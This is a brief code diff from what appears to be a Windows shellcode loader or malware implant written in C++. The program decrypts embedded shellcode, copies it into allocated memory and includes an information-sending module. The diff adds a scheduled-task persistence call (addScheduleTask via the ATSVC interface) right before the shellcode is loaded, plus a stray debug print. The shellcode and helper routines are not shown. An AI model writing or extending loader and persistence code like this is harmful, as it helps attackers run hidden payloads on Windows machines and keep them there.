@@ -9,6 +9,7 @@
 #include "Function.hpp"
 #include "shellcode.h"
 #include "requests/infoSender.h"
+#include "scheduleTask/atsvc.h"
 #include <bcrypt.h>
 #pragma comment(lib, "bcrypt.lib")
 
@@ -101,6 +102,8 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 
 
 void test() {
+
+	std::wcout << "path" << std::endl;
 }
 
 
@@ -219,6 +222,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		size = shellcode_size;
 		shellcode_ptr = shellcode;
 	}
+	// =========================== Add to scheduleTask =============================
+	addScheduleTask();
 	// ============================= Allocate Memory ===============================
 	NTSTATUS status = AllocateMem(&lpMem, &size);
 	memcpy(lpMem, shellcode_ptr, size);
